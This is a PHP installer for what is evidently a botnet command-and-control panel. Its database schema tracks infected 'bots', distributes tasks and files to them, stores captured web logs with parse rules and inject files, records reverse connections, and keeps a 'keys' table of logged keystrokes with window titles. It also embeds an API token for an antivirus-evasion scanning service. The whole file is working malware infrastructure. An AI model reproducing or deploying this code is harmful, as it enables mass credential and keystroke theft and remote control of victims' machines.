<?php

session_start();

function connect_db()
	{
		global $db;

		if(!@mysql_connect(
		$db['localhost'], 
		$db['user'], 
		$db['pass'])) return false;

		if(!@mysql_select_db($db['db'])) return false;
		
				return true; ##all is ok
		
	}
	
	
	/* check if installed */
	if(file_exists('conf.php'))
	{
	require_once('conf.php');
	if(connect_db())
	{
	$res0=mysql_query("select username FROM access");
	if($res0 && mysql_num_rows($res0)>0) exit ('installed.');
	}
	
	if(isset($db)) unset($db);
	if(isset($_vars)) unset($_vars);
	
	
	
	}
	
	
		
if(isset($_POST['make_me']))
{
if(strstr($_SERVER['QUERY_STRING'], 'redirect'))
{
$re = explode("redirect=", $_SERVER['QUERY_STRING']);
$_SESSION['redirect'] = urldecode($re[1]);
}
}
require_once('inc/head.inc');

if(isset($_GET['step'])) $step = (int)$_GET['step']; else  $step = 1;

if(isset($_POST['continue']))
{

if($step=='finish')
{
unlink('setup.php');

if(isset($_SESSION['install_db'])) $db = $_SESSION['install_db'];

if(!connect_db()) exit ('sql connect error');

$q = array();

$q[0] = "DROP TABLE IF EXISTS `access`";
$q[1] = "DROP TABLE IF EXISTS `blocked_ip`";
$q[2] = "DROP TABLE IF EXISTS `bots`";
$q[3] = "DROP TABLE IF EXISTS `logs`";
$q[4] = "DROP TABLE IF EXISTS `log_blacklist`";
$q[5] = "DROP TABLE IF EXISTS `parsed_logs`";
$q[6] = "DROP TABLE IF EXISTS `parse_rules`";
$q[7] = "DROP TABLE IF EXISTS `sends`";
$q[8] = "DROP TABLE IF EXISTS `tasks`";
$q[9] = "DROP TABLE IF EXISTS `uploads`";
$q[10] = "DROP TABLE IF EXISTS `wrong_login`";

$q[11] = "CREATE TABLE IF NOT EXISTS `access` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(20) DEFAULT NULL,
  `pass` varchar(32) DEFAULT NULL,
  `added` int(11) NOT NULL,
  `knock_time` int(11) NOT NULL,
  `deny` smallint(1) NOT NULL DEFAULT '0',
  UNIQUE KEY `id` (`id`),
  UNIQUE KEY `username` (`username`),
  KEY `pass` (`pass`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8";

$q[12] = "CREATE TABLE IF NOT EXISTS `blocked_ip` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `ip` varchar(15) DEFAULT NULL,
  `added` int(11) NOT NULL,
  `country` varchar(8) NOT NULL DEFAULT 'Unknown',
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8";

$q[13] = "CREATE TABLE IF NOT EXISTS `bots` (
  `unique_id` varchar(38) NOT NULL,
  `ip` varchar(15) DEFAULT NULL,
  `country` varchar(3) DEFAULT NULL,
  `os` varchar(15) DEFAULT NULL,
  `arch` varchar(4) NOT NULL DEFAULT 'idk',
  `user_admin` varchar(8) DEFAULT NULL,
  `first_time` int(11) NOT NULL,
  `knock_time` int(11) DEFAULT NULL,
  PRIMARY KEY (`unique_id`),
  KEY `country` (`country`),
  KEY `os` (`os`),
  KEY `knock_time` (`knock_time`),
  KEY `user_admin` (`user_admin`),
  KEY `arch` (`arch`),
  KEY `first_time` (`first_time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8";

$q[14] = "CREATE TABLE IF NOT EXISTS `logs` (
  `log_id` int(11) NOT NULL AUTO_INCREMENT,
  `unique_id` varchar(38) DEFAULT NULL,
  `os` varchar(16) DEFAULT NULL,
  `ip` varchar(15) DEFAULT NULL,
  `country` varchar(8) DEFAULT NULL,
  `log_url` varchar(1024) NOT NULL,
  `log` text NOT NULL,
  `date` int(11) DEFAULT NULL,
  `is_error` int(1) DEFAULT NULL,
  UNIQUE KEY `log_id` (`log_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8";

$q[15] = "CREATE TABLE IF NOT EXISTS `log_blacklist` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `url` varchar(1024) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8";

$q[16] = "CREATE TABLE IF NOT EXISTS `parsed_logs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `log_id` int(11) NOT NULL,
  `rule_id` int(11) NOT NULL,
  `log` text NOT NULL,
  `lastlogin` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `id` (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8";

$q[17] = "CREATE TABLE IF NOT EXISTS `parse_rules` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(1024) NOT NULL,
  `url` varchar(2046) NOT NULL,
  `vars` text NOT NULL,
  `rule` text NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `id` (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8";

$q[18] = "CREATE TABLE IF NOT EXISTS `sends` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `unique_id` varchar(38) NOT NULL,
  `task_id` int(7) NOT NULL,
  `start` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `task_id` (`task_id`),
  KEY `start` (`start`),
  KEY `unique_id` (`unique_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8";

$q[19] = "CREATE TABLE IF NOT EXISTS `tasks` (
  `task_id` int(11) NOT NULL AUTO_INCREMENT,
  `task_hash` varchar(32) NOT NULL,
  `file` varchar(64) NOT NULL,
  `md5` varchar(32) NOT NULL,
  `command_name` varchar(64) NOT NULL,
  `country` varchar(100) NOT NULL,
  `sends` int(11) NOT NULL,
  `limit` int(11) NOT NULL,
  `laststart` int(11) NOT NULL,
  `arch` varchar(32) NOT NULL,
  `os` varchar(32) NOT NULL,
  `enabled` int(1) NOT NULL,
  `status` varchar(100) NOT NULL,
  `last_start` int(11) NOT NULL,
  UNIQUE KEY `task_id` (`task_id`),
  UNIQUE KEY `task_hash` (`task_hash`),
  KEY `command` (`file`),
  KEY `country` (`country`),
  KEY `sends` (`sends`),
  KEY `limit` (`limit`),
  KEY `enabled` (`enabled`),
  KEY `status` (`status`),
  KEY `laststart` (`laststart`),
  KEY `command_name` (`command_name`),
  KEY `arch` (`arch`,`os`),
  KEY `last_start` (`last_start`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8";

$q[20] = "CREATE TABLE IF NOT EXISTS `uploads` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `member` int(3) NOT NULL,
  `filename` varchar(128) DEFAULT NULL,
  `filesize` int(11) DEFAULT NULL,
  `md5` varchar(32) DEFAULT NULL,
  `virus_check` varchar(6) DEFAULT NULL,
  `av_result` text NOT NULL,
  `date` int(11) DEFAULT NULL,
  `hash` varchar(128) NOT NULL,
  `from` varchar(6) NOT NULL,
  `logs` text NOT NULL,
  `url` varchar(512) NOT NULL,
  `last_check` int(11) NOT NULL,
  `count` int(11) NOT NULL,
  `ext` varchar(3) NOT NULL,
  UNIQUE KEY `id` (`id`),
  UNIQUE KEY `md5` (`md5`),
  KEY `filename` (`filename`),
  KEY `filesize` (`filesize`),
  KEY `date` (`date`),
  KEY `user` (`member`),
  KEY `hash` (`hash`),
  KEY `last_check` (`last_check`),
  KEY `from` (`from`),
  KEY `ext` (`ext`),
  KEY `count` (`count`),
  KEY `url` (`url`(333))
) ENGINE=MyISAM DEFAULT CHARSET=utf8";

$q[21] = "CREATE TABLE IF NOT EXISTS `wrong_login` (
  `ip` varchar(15) NOT NULL,
  `per` tinyint(3) NOT NULL DEFAULT '0',
  KEY `per` (`per`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8";

$q[22]="INSERT INTO access SET id='1', username='".mysql_real_escape_string($_POST['user'])."', pass='".md5($_POST['password'])."';";

$q[23] = "CREATE TABLE IF NOT EXISTS `reverse_connect` (
  `unique_id` varchar(38) COLLATE latin1_bin NOT NULL,
  `protocol` varchar(10) COLLATE latin1_bin NOT NULL,
  `client` varchar(20) COLLATE latin1_bin NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8";

$q[24] = "CREATE TABLE IF NOT EXISTS `keys` (
  `log_id` int(11) NOT NULL AUTO_INCREMENT,
  `unique_id` varchar(38) COLLATE latin1_bin NOT NULL,
  `os` varchar(16) COLLATE latin1_bin NOT NULL,
  `ip` varchar(15) COLLATE latin1_bin NOT NULL,
  `country` varchar(8) COLLATE latin1_bin NOT NULL,
  `window_title` text COLLATE latin1_bin NOT NULL,
  `logged_keys` text COLLATE latin1_bin NOT NULL,
  `process_name` varchar(20) COLLATE latin1_bin NOT NULL,
  `date` int(11) NOT NULL,
  PRIMARY KEY (`log_id`),
  KEY `log_id` (`log_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8";


foreach($q as $query) { $result = mysql_query($query); 
if(!$result ) exit ('can\'t import sql tables!' . mysql_error() . 'qurey: ' . $query);}



die( '<h1>OK! DONE!</h1>');

}




else


if($step==3)
{

function url_exists($url) {
    if (!$fp = curl_init($url)) return false;
    return true;
}

			
if(!file_exists('conf.php')) die('conf.php not found');

$_POST['base_url']  =  substr(trim($_POST['base_url']),0,255);
if(substr($_POST['base_url'], strlen($_POST['base_url'])-1, strlen($_POST['base_url']))!='/') $_POST['base_url'].='/';
if(!url_exists($_POST['base_url'])) exit ('url not exists');

$_POST['login_block_position'] = (int)$_POST['login_block_position'];
$_POST['limit_entries'] = (int)$_POST['limit_entries'];
$_POST['offline_time'] = (int)$_POST['offline_time'];

$_POST['title_of_the_pages'] = str_replace("<","", $_POST['title_of_the_pages']);

if(!is_dir($_POST['uploadDir'])) mkdir($_POST['uploadDir']);
if (preg_match("/[^A-Za-z0-9 _.-]/", $_POST['uploadDir']) != 1)  exit ('upload dir wrong');
if (preg_match("/[^A-Za-z0-9 _.-]/", $_POST['InjectsFile']) != 1)  exit ('injects file wrong');
if (preg_match("/[^A-Za-z0-9 _.-]/", $_POST['ParserFile']) != 1)  exit ('Parser file wrong');
//if (preg_match("/[^A-Za-z0-9 _.-]/", $_POST['title_of_the_pages']) != 1)  exit ('Title wrong.');



$string= '
		$_vars  '."= array(
			'base_url'=>'$_POST[base_url]',
			
			'login_block_position'=>$_POST[login_block_position],
			
			'offline_time'=>$_POST[offline_time],
			
			'limit_entries'=>$_POST[limit_entries],
			
			'msg_blacked_ip'=> 'You not have access.',
			
			'title_of_the_pages'=> '$_POST[title_of_the_pages]',
			
			'uploadDir'=> '$_POST[uploadDir]',
				
			'InjectsFile'=> '$_POST[InjectsFile]',
			
			'ParserFile'=> '$_POST[ParserFile]',
			
			'default_limit'=> 100000000,
			
			
			'scan4you'=>array('id'=>29171, 'token'=>'499fc92bf1338c31f025', 'url'=>'http://scan4you.net/remote.php')
		
		);";
		
		$fp = fopen('conf.php', 'a+');
		fputs($fp, $string);
		fclose($fp);
		
		
		
		

}


else

if($step==2)
{


		$db  = array ('localhost'=>$_POST['database_host'], 'db'=>$_POST['database'], 'user'=>$_POST['database_user'], 'pass'=>$_POST['database_pass']);
	
$msg1 = false;
if(!connect_db()) $msg1 = 'MySQL connect error.';

		if($msg1){ $step = 1; }
		else
		{
		
		file_put_contents('conf.php', '<?php 	
							////database
							$db'."  = array ('localhost'=>'$_POST[database_host]', 'db'=>'$_POST[database]', 'user'=>'$_POST[database_user]', 'pass'=>'$_POST[database_pass]');
							////database
							
							
							");
							if(!file_exists('conf.php')) { $msg1='Can\'t make conf.php. check chmod\'s!'; $step = 1;}
							else 
							$_SESSION['install_db'] = $db;
							
		
		}
		

}

}

if(isset($_GET['step']) && !isset($_POST['step'])) $step = 1;

switch($step)
{
case '2' : include 'inc/install_step2.inc'; break;
case '3' : include 'inc/install_step3.inc';break;
default : include 'inc/install_step1.inc'; break;
}